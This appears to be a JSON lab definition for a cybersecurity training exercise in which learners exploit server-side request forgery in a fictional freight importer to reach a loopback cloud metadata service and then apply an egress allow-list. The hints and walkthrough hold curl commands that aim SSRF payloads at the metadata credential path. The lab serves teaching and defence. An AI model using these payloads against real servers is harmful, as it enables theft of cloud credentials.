@@ -1,0 +1,153 @@
+{
+  "schemaVersion": 1,
+  "id": "ssrf-metadata-hunt",
+  "version": "1.0.0",
+  "status": "published",
+  "title": "Fetch Me a Secret",
+  "subtitle": "Pivot through Halcyon's importer to the metadata service",
+  "category": "API Security",
+  "difficulty": "Intermediate",
+  "estimatedMinutes": 28,
+  "skills": [
+    "SSRF",
+    "Cloud metadata",
+    "URL validation",
+    "Egress control"
+  ],
+  "summary": "Halcyon's document importer will fetch any URL. Reach the loopback metadata service, steal the credential token, then restrict egress to supplier hosts.",
+  "scenario": "Halcyon Freight imports supplier documents server-side. The importer validates the scheme but not the destination, and the session runs a metadata service on loopback. Demonstrate the pivot, then apply an allow-list that keeps supplier imports working.",
+  "prerequisites": [
+    "curl",
+    "Understanding of loopback vs public addresses"
+  ],
+  "learningObjectives": [
+    "Identify server-side request forgery",
+    "Reach a loopback-only metadata endpoint",
+    "Apply and verify destination allow-listing"
+  ],
+  "authorizedScope": "Only the Halcyon session, including its loopback metadata service. Credentials are synthetic.",
+  "riskSummary": "SSRF turns a server-side fetcher into a proxy for internal networks and cloud metadata, often yielding credentials that grant cloud-wide access.",
+  "remediation": "Allow-list destinations, resolve DNS and re-check the address, block link-local and loopback ranges, and require metadata services to use IMDSv2-style sessions.",
+  "conclusion": "You pivoted through the importer into the loopback metadata service and then closed the hole with a destination allow-list.",
+  "baseXp": 150,
+  "workspace": {
+    "image": "cipherforge/workspace:1.2.0",
+    "tools": [
+      "curl",
+      "jq",
+      "python3",
+      "labctl"
+    ]
+  },
+  "services": [
+    {
+      "name": "app",
+      "role": "target",
+      "app": "ssrf-metadata-hunt/app/server.mjs",
+      "ports": [
+        {
+          "port": 8080,
+          "protocol": "http",
+          "published": true,
+          "name": "web"
+        }
+      ],
+      "health": {
+        "kind": "http",
+        "path": "/api/health",
+        "expectStatus": 200,
+        "expectBody": "halcyon-importer",
+        "timeoutSeconds": 30
+      },
+      "flagObjectives": [
+        "metadata-flag"
+      ]
+    }
+  ],
+  "resources": {
+    "cpus": 0.5,
+    "memoryMb": 360,
+    "pids": 96,
+    "writableDiskMb": 64,
+    "maxMinutes": 45,
+    "idleTimeoutMinutes": 20
+  },
+  "network": {
+    "outbound": "deny",
+    "internalPorts": [
+      8080,
+      9090
+    ]
+  },
+  "objectives": [
+    {
+      "id": "metadata-flag",
+      "title": "Steal the metadata token",
+      "description": "Point the importer at the loopback metadata service and submit the token from the credential document.",
+      "validation": {
+        "type": "flag",
+        "objectiveKind": "flag",
+        "xp": 55
+      },
+      "hints": [
+        {
+          "id": "h1",
+          "text": "The importer POSTs JSON: `curl -s -X POST -H 'content-type: application/json' -d '{\"url\":\"http://127.0.0.1:9090/latest/meta-data/\"}' $CF_TARGET_URL/api/import`.",
+          "xpPenalty": 5
+        },
+        {
+          "id": "h2",
+          "text": "Follow the advertised paths to `iam/security-credentials/freight-importer`.",
+          "xpPenalty": 10
+        }
+      ]
+    },
+    {
+      "id": "allowlist",
+      "title": "Allow-list the importer",
+      "description": "Apply the egress policy so loopback and encoded-metadata targets are rejected while the supplier host still passes validation.",
+      "validation": {
+        "type": "check",
+        "objectiveKind": "check",
+        "xp": 70,
+        "validator": "egress-allowlist",
+        "criteria": [
+          "loopback metadata URL returns 403",
+          "alternate loopback encoding rejected",
+          "allowlisted supplier host still accepted"
+        ]
+      },
+      "hints": [
+        {
+          "id": "h1",
+          "text": "Apply `{\"allowlistUrls\": true}` with `labctl policy apply -`, then retry both the metadata URL and the supplier URL.",
+          "xpPenalty": 5
+        }
+      ]
+    }
+  ],
+  "validators": [
+    "egress-allowlist"
+  ],
+  "provisioner": {
+    "script": "ssrf-metadata-hunt/provision.mjs",
+    "timeoutSeconds": 45
+  },
+  "walkthrough": [
+    {
+      "title": "Read the import API",
+      "body": "The importer accepts a URL and fetches it server-side.",
+      "snippet": "curl -s $CF_TARGET_URL/api/imports | jq"
+    },
+    {
+      "title": "Pivot to metadata",
+      "body": "Loopback is not filtered, so the importer reaches the metadata service.",
+      "snippet": "curl -s -X POST -H 'content-type: application/json' -d '{\"url\":\"http://127.0.0.1:9090/latest/meta-data/iam/security-credentials/freight-importer\"}' $CF_TARGET_URL/api/import | jq"
+    },
+    {
+      "title": "Restrict egress",
+      "body": "Allow-list destinations and confirm the pivot is closed.",
+      "snippet": "echo '{\"allowlistUrls\": true}' | labctl policy apply -"
+    }
+  ]
+}
